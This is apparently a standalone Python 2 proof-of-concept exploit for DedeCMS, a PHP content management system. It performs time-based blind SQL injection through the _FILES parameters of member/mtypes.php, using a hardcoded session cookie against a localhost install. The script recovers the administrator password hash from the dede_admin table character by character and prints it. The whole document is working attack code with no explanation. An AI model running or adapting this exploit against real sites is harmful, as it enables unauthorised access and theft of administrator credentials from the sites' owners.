import urllib2
import time

opener = urllib2.build_opener()



opener.addheaders.append(('Cookie', 'PHPSESSID=thr71ua1g91j9d5lf79tr70ri1; DedeUserID=2; DedeUserID__ckMd5=6425e9e8f081fd4b; DedeLoginTime=1450059059; DedeLoginTime__ckMd5=0cae1010080d973a; last_vtime=1449818368; last_vtime__ckMd5=a8cc9e405d9da0bd; last_vid=tmdsb; last_vid__ckMd5=c6de842f1764c614'))




payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'



name = ""




for i in range(1,21):



    for p in payloads:



        s1 = "%s" %(i)



        s2 = "%s" %(ord(p))



        s = "http://localhost/d2/member/mtypes.php?dopost=save&_FILES[mtypename][name]=.xxxx&_FILES[mtypename][type]=xxxxx&_FILES[mtypename][tmp_name][a'%20and%20`'`.``.mtypeid%20or%20if(ascii(substr((select%20pwd%20from%20dede_admin%20limit%201),"+s1+",1))%3d"+s2+",sleep(3),0)%20and%20mtypeid%3d1%23]=w&_FILES[mtypename][size]=.xxxx"

        start_time = time.time()



        try:



            req = urllib2.Request(s)
                        
            req_data=opener.open(req,timeout=10)

            if time.time() - start_time > 2.0:

                name = name+p

                print name+'.....'



        except urllib2.URLError,e:

             break

print 'password is %s'  % name
